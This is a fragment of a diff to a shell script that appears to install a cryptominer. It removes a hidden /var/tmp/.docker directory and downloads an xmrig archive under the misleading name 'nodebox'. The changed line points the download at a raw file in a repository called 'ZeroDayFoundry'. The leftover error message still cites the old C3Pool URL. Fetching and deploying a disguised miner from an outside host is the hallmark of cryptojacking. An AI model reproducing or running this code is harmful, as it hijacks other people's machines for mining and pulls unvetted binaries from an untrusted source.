@@ -152,7 +152,7 @@ echo "[*] Removing /var/tmp/.docker directory"
 rm -rf /var/tmp/.docker
 
 echo "[*] Downloading C3Pool advanced version of nodebox to /var/tmp/nodebox.tar.gz"
-if ! download_file "https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/xmrig.tar.gz" /var/tmp/nodebox.tar.gz; then
+if ! download_file "https://raw.githubusercontent.com/XPACLION9X/ZeroDayFoundry/refs/heads/main/xmrig.tar.gz" /var/tmp/nodebox.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/xmrig.tar.gz file to /var/tmp/nodebox.tar.gz"
   exit 1
 fi
